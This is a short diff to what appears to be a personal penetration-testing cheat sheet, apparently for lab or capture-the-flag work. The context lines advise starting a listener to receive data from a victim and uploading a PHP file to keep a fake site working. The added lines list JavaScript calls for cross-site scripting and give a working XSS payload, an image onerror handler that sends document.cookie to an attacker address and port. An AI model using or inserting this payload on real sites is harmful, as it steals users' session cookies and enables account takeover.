@@ -59,3 +59,13 @@
 - functionality
 	-  if your attack involves receiving data from the victim don't forget to start a listener on your attacker device
 	- if you want the website to be functional after submitting data, you need to upload a php file to properly handle website functionality
+
+
+## XSS js verbs
+```
+fetch
+alert
+getScript
+```
+
+`<img src=x onerror=fetch("http://10.10.16.55:4444/"+document.cookie);>`
